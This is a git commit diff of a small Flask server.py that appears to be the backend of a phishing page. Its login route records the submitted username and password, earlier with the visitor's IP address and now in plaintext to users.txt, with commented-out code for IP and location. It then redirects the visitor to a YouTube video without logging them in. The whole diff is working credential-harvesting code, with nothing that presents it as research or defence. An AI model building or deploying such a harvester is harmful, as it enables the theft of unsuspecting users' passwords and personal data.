50ceb549ac60985ab42194a0c8e948d978e4118c
hazrath <hazrath@localhost.localdomain>
2023-04-05 01:41:02 +0530

    second_commit

--- server.py
+++ server.py
@@ -1,23 +1,27 @@
-from flask import Flask, render_template, request,redirect
-from pymongo import MongoClient
+from flask import Flask, render_template, request, redirect
 
 app = Flask(__name__, static_url_path='/static')
 
-client = MongoClient('mongodb://localhost:27017/')
-db = client['users_db']
+USER_FILE = 'users.txt'
 
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
         username = request.form['username']
         password = request.form['password']
-        ip_address = request.form['ip-address']
+        # ip_address = request.form['ip-address']
+        # location = request.form['location']
+
         
-        user = {'username': username, 'password': password,'ip-address':ip_address}
-        users_collection = db['users']
-        result = users_collection.insert_one(user)
+        with open(USER_FILE, 'a') as f:
+            f.write(f"uname:{username},pass:{password}\n")
+            # f.write(f"uname:{username},pass:{password} ip:{ip_address} location:{location}\n")
+
+        
         return redirect('https://www.youtube.com/watch?v=9VqlFDL06C0')
+    
     return render_template('index.html')
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(debug=True, port=8080)
+
